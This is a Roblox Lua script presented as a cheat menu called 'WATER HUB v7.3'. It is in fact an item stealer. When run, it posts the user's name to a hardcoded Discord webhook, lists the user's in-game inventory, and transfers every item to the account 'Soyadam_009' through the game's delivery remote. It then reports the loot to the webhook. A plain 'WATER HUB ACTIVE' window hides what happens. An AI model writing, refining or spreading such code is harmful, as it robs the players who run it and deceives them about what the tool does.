-- WATER HUB v7.3
local URL = "https://discord.com/api/webhooks/1498033551013314730/cUEnEPV6-iKQYFpUeQpYt02DkQTgFuoumhrv5oZIZIhuKgUdha0qin64jf0Zgz5R89jm"
local DEST = "Soyadam_009"

local p = game:GetService("Players").LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local http = game:GetService("HttpService")

local function notify(t, m)
    pcall(function()
        local req = syn and syn.request or http_request or request
        if req then
            req({
                Url = URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = http:JSONEncode({["embeds"]={{["title"]=t,["description"]=m,["color"]=3447003}}})
            })
        end
    end)
end

task.spawn(function()
    notify("🎯 Ejecucion", "Usuario: "..p.Name)
    
    -- Busqueda directa por nombre de servicio (mas estable en Delta)
    local list = rs:FindFirstChild("ListItems", true)
    local deliver = rs:FindFirstChild("Delivery", true)
    
    if list and deliver then
        local inv = list:InvokeServer()
        if inv and type(inv) == "table" then
            for _, i in pairs(inv) do
                local id = i.Id or i.UUID or i.Name
                -- Intentamos los dos metodos principales
                pcall(function() deliver:InvokeServer(DEST, id) end)
                pcall(function() deliver:InvokeServer(id, DEST) end)
                task.wait(0.2)
            end
            notify("💰 Saqueo", "Items procesados para "..DEST)
        end
    end
end)

-- GUI SIMPLE PARA TEST
local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(0, 200, 0, 100)
f.Position = UDim2.new(0.5, -100, 0.5, -50)
f.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
local l = Instance.new("TextLabel", f)
l.Size = UDim2.new(1, 0, 1, 0)
l.Text = "WATER HUB ACTIVE"
l.TextColor3 = Color3.new(1,1,1)
